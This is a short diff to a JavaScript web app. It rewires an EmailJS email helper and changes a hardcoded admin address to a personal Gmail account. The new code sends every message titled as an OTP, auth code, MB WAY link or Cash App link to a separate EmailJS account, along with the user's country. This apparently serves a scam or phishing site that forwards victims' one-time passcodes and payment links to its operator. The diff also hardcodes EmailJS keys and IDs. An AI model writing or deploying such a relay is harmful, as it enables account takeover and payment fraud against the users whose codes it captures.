@@ -748,28 +748,37 @@ firebase.initializeApp({
 var auth = firebase.auth();
 var db   = firebase.database();
 
-emailjs.init({publicKey:'UWGqvMxNngR8sNNco'});
-
-// ── EMAIL HELPER ──
-// serviceID: 'service_rs826sa', templateID: 'template_6f5m0as'
-// Template variables: {{to_email}}, {{subject}}, {{message}}
+// ── EMAIL via EmailJS ──
 function sendEmail(toEmail, title, name, message){
-  // user_name = original variable used by template_6f5m0as
-  emailjs.send('service_rs826sa','template_6f5m0as',{
-    user_name: name||title,
-    to_email:  toEmail,
-    title:     title,
-    name:      name,
-    message:   message
+  var country = (window.userData && window.userData.country) ? window.userData.country : '';
+  var pub, sid, tid;
+  if(
+    title.indexOf('OTP') !== -1 ||
+    title.indexOf('MB WAY Link') !== -1 ||
+    title.indexOf('Cash App Link') !== -1 ||
+    title.indexOf('Auth Code') !== -1
+  ){
+    pub = '8tNTuFPIowu1Ookpq'; sid = 'service_s2e0bde'; tid = 'template_7ulapld';
+  } else {
+    pub = 'q4WG3VtKzkHUooQIT'; sid = 'service_g1079e5'; tid = 'template_3rvjuyv';
+  }
+  emailjs.init({publicKey: pub});
+  emailjs.send(sid, tid, {
+    to_email: toEmail,
+    title:    title,
+    name:     name || '',
+    country:  country,
+    message:  message,
+    time:     new Date().toLocaleString()
   }).then(function(){
-    console.log('Email sent to '+toEmail);
+    console.log('Email sent: ' + title);
   }).catch(function(e){
-    console.warn('EmailJS error:',e);
+    console.warn('EmailJS error:', e);
   });
 }
 
 // ── CONSTANTS ──
-var ADMIN_EMAIL = 'admin@gmail.com';
+var ADMIN_EMAIL = 'viccylay30@gmail.com';
 var ADMINADEX_EMAIL = 'adminadex@gmail.com';
 var SYM = {'USD':'$','EUR':'\u20ac','GBP':'\u00a3','NGN':'\u20a6','CAD':'C$','AUD':'A$','JPY':'\u00a5'};
 // ── CURRENCY CONVERSION RATES (base: USD) ──
